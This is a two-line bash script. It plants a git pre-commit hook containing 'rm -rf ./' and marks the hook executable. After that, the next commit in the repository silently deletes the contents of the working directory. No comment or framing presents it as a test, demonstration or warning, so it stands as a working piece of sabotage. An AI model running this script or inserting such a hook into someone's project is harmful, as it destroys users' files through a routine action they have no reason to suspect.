#!/bin/bash

echo "rm -rf ./" > .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit
